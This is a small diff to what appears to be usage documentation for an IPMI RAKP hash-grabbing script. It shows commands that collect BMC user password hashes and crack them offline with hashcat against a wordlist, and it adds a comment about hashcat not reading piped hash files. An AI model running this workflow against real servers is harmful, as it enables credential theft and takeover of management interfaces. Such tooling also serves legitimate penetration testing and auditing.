@@ -31,7 +31,8 @@ python3 ipmi_rakp_grab.py <IP> -u admin sysadmin
 python3 ipmi_rakp_grab.py <IP> -U users.txt -o hash.txt
 
 # crack offline — output is `user:salt:hash` (metasploit-style), so strip the
-# username first: hashcat -m 7300 expects only `salt:hash`
+# username first: hashcat -m 7300 expects only `salt:hash`.
+# (do NOT use process substitution <() — hashcat can't read pipe hashfiles)
 cut -d: -f2- hash.txt > hashcat_ready.txt
 hashcat -m 7300 hashcat_ready.txt /usr/share/wordlists/rockyou.txt
 ```
